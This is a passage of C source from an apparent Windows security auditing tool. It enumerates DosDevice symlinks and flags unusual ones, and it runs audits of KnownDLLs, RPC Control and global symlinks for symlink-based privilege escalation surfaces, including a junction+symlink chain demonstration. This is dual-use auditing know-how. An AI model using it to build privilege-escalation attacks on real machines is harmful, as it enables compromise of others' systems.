        if (QueryDosDeviceW(p, target, _countof(target))) {
            /* Flag non-standard device names (not drive letters, not \\Device\\*) */
            BOOL isDriveLetter = (wcslen(p) == 2 && p[1] == L':');
            BOOL isStdDevice   = (wcsncmp(target, L"\\Device\\", 8) == 0);
            BOOL isStdHarddisk = (wcsncmp(target, L"\\??\\", 4) == 0);

            if (!isDriveLetter && !isStdDevice && !isStdHarddisk) {
                suspCount++;
                PrintInfo(L"      [SUSPICIOUS] %s → %s\n", p, target);
            }
            count++;
        }
        p += wcslen(p) + 1;
    }
    PrintInfo(L"      Total DosDevice entries: %lu | Suspicious: %lu\n\n",
              count, suspCount);
}

/* -----------------------------------------------------------------------
 * Module entry point
 * --------------------------------------------------------------------- */
void Module_SymlinkPrimitives(void) {
    PrintHeader(
        L"NT SYMLINK PRIMITIVES  "
        L"[Junction+symlink chain, KnownDLLs, RPC Control, DosDevice audit]");

    PrintInfo(
        L"  Based on: James Forshaw's symboliclink-testing-tools (Project Zero)\n"
        L"  Audits NT object namespace for symlink-based LPE surfaces.\n"
        L"  Also verifies junction+symlink chain viability on this system.\n\n");

    DWORD findings = 0;
    AuditGlobalSymlinks(&findings);
    AuditKnownDLLsWritability(&findings);
    AuditRPCControlWritability(&findings);
    DemoJunctionSymlinkChain();
    AuditDosDeviceLinks();

    if (findings == 0)
        PrintInfo(L"  No critical symlink surface found.\n");
    else
        PrintInfo(L"  Total findings: %lu\n", findings);
}
